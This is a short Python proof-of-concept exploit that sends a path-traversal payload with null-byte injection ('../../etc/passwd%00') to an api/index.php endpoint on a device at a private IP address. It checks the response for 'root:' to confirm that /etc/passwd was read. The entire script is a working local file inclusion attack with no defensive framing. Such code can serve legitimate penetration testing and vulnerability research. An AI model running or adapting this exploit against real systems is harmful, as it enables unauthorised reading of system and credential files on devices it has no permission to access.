import requests

TARGET_IP = "192.168.1.173"
TARGET_URL = f"http://{TARGET_IP}/api/index.php"

def check_lfi():
    # Attempt to read /etc/passwd using LFI in wlan.php
    # Path constructed: /www/inc/wlan-{PAYLOAD}.php
    # Payload: ../../etc/passwd%00
    
    payload = "wlan/../../etc/passwd%00"
    params = {
        'url': payload
    }
    
    print(f"[+] Testing LFI with payload: {payload}")
    try:
        response = requests.get(TARGET_URL, params=params, timeout=5)
        print(f"[+] Status Code: {response.status_code}")
        if "root:" in response.text:
            print("[+] SUCCESS: /etc/passwd found! Null byte injection works.")
            print(response.text[:200])
        else:
            print("[-] LFI failed or file not found.")
            # print(response.text[:200])
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    check_lfi()
